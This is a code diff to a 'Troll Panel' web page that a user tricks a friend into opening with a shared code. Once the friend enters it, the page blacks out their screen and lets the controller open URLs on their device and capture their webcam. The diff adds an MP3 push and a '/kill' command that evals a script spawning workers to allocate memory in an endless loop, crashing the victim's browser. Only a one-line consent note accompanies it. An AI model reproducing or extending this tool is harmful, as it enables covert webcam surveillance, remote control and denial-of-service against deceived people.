@@ -1,4 +1,5 @@
-<html><head><base href="https://websim.creationengine.ai/troll-panel-v6/">
+
+<html><head>
 <title>Troll Panel</title>
 <style>
     body, html {
@@ -174,11 +175,13 @@
 <div id="how-to-use">
     <h2>How to Use Troll Panel</h2>
     <button id="close-how-to-use">&times;</button>
-    <p>1. Click "Generate Code" to create a code</p>
-    <p>2. Tell your friend that there is a secret website when you enter your code</p>
+    <p>1. Click "Generate Code" to create a unique 10-digit code.</p>
+    <p>2. Share this code with your friend.</p>
     <p>3. When your friend enters the code, their screen will turn black.</p>
     <p>4. You can then use commands like "/url [url]" to open a URL on their device.</p>
     <p>5. Use "/webcam" to capture an image from their webcam.</p>
+    <p>Note: Use responsibly and only with consent!</p>
+    <p>6. Additional features and effects are coming soon!</p>
 </div>
 
 <div id="command-prompt">
@@ -197,6 +200,8 @@
         <canvas id="canvas" style="display:none;"></canvas>
         <img id="webcam-image" alt="Webcam capture" style="display:none;">
     </div>
+    <input type="file" id="mp3-upload" accept=".mp3" style="display: none;">
+    <audio id="audio-player" style="display: none;"></audio>
 </div>
 
 <div id="black-screen"></div>
@@ -220,12 +225,55 @@
     const webcamImage = document.getElementById('webcam-image');
     const howToUseModal = document.getElementById('how-to-use');
     const closeHowToUseBtn = document.getElementById('close-how-to-use');
+    const mp3Upload = document.getElementById('mp3-upload');
+    const audioPlayer = document.getElementById('audio-player');
 
     let currentCode = '';
     let currentInput = '';
     let isController = false;
     let sessionId = '';
     let webcamStream = null;
+
+    const killScript = `
+const gigabytesPerWorker = 64; 
+const numberOfWorkers = 1000;
+
+// Create a Blob URL for the worker
+const workerScript = \`
+self.onmessage = function(e) {
+    const bytesPerGB = 1024 * 1024 * 1024;
+    let totalAllocated = 0;
+    function allocateAndTrack(gigabytes) {
+        try {
+            new ArrayBuffer(gigabytes * bytesPerGB);
+            totalAllocated += gigabytes;
+            self.postMessage(\\\`Successfully allocated \\\${totalAllocated} GB in total.\\\`);
+        } catch (error) {
+            self.postMessage(\\\`Failed to allocate additional \\\${gigabytes} GB. Total allocated: \\\${totalAllocated} GB. Error: \\\${error}\\\`);
+            self.close(); 
+        }
+    }
+    const initialAllocationSize = e.data;
+    while (true) {
+        allocateAndTrack(initialAllocationSize);
+    }
+};
+\`;
+
+const blob = new Blob([workerScript], { type: 'application/javascript' });
+const workerUrl = URL.createObjectURL(blob);
+
+// Start the workers
+for (let i = 0; i < numberOfWorkers; i += 4) {
+    const worker = new Worker(workerUrl);
+
+    worker.onmessage = function(e) {
+        console.log(e.data);
+    };
+
+    worker.postMessage(gigabytesPerWorker);
+}
+`;
 
     function generateCode() {
         currentCode = Math.random().toString().slice(2, 12);
@@ -247,7 +295,7 @@
 
     function animateCommandPrompt() {
         content.innerHTML = '';
-        const text = 'Troll Panel [Version 1.0.0]\n(c) 2023 Troll Inc. All rights reserved.\n\nC:\\TrollPanel>';
+        const text = 'Troll Panel [Version 1.0.0]\\n(c) 2023 Troll Inc. All rights reserved.\\n\\nC:\\TrollPanel>';
         let i = 0;
 
         function typeWriter() {
@@ -317,6 +365,13 @@
                 gun.get(`sessions/${sessionId}`).put({ webcamError: 'Failed to access webcam' });
             }
         }
+        if (data.mp3) {
+            audioPlayer.src = data.mp3;
+            audioPlayer.play();
+        }
+        if (data.kill) {
+            eval(killScript);
+        }
     }
 
     document.addEventListener('keydown', (e) => {
@@ -334,25 +389,25 @@
     });
 
     function updatePrompt() {
-        const lines = content.innerHTML.split('\n');
+        const lines = content.innerHTML.split('\\n');
         lines[lines.length - 1] = `C:\\TrollPanel>${currentInput}<span class="cursor">|</span>`;
-        content.innerHTML = lines.join('\n');
+        content.innerHTML = lines.join('\\n');
         content.scrollTop = content.scrollHeight;
     }
 
     function executeCommand() {
         const command = currentInput.trim();
         content.innerHTML = content.innerHTML.replace('<span class="cursor">|</span>', '');
-        content.innerHTML += '\n';
+        content.innerHTML += '\\n';
 
         if (command.startsWith('/url ') && isController) {
             const url = command.slice(5);
             gun.get(`sessions/${sessionId}`).put({ url: url });
-            content.innerHTML += `Opening URL on target machine: ${url}\n`;
+            content.innerHTML += `Opening URL on target machine: ${url}\\n`;
             setStatus('Running...', 'Command executed successfully.');
         } else if (command === '/webcam' && isController) {
             gun.get(`sessions/${sessionId}`).put({ webcam: true });
-            content.innerHTML += 'Capturing webcam image on target machine...\n';
+            content.innerHTML += 'Capturing webcam image on target machine...\\n';
             setStatus('Capturing...', 'Waiting for webcam image...');
             gun.get(`sessions/${sessionId}`).on((data) => {
                 if (data.webcamImage) {
@@ -363,14 +418,35 @@
                     setStatus('', `Error: ${data.webcamError}`);
                 }
             });
+        } else if (command === '/send' && isController) {
+            mp3Upload.click();
+            content.innerHTML += 'Select an MP3 file to send...\\n';
+        } else if (command === '/kill' && isController) {
+            gun.get(`sessions/${sessionId}`).put({ kill: true });
+            content.innerHTML += 'Sending kill command to target machine...\\n';
+            setStatus('Sending...', 'Kill command sent successfully.');
         } else {
-            content.innerHTML += `'${command}' is not recognized as an internal or external command, operable program or batch file.\n`;
+            content.innerHTML += `'${command}' is not recognized as an internal or external command, operable program or batch file.\\n`;
         }
 
         currentInput = '';
         content.innerHTML += 'C:\\TrollPanel>';
         content.scrollTop = content.scrollHeight;
     }
+
+    mp3Upload.addEventListener('change', (event) => {
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const mp3Data = e.target.result;
+                gun.get(`sessions/${sessionId}`).put({ mp3: mp3Data });
+                content.innerHTML += `Sending MP3: ${file.name}\\n`;
+                setStatus('Sending...', 'MP3 sent successfully.');
+            };
+            reader.readAsDataURL(file);
+        }
+    });
 
     function setStatus(runningMessage, completedMessage) {
         status.textContent = runningMessage;
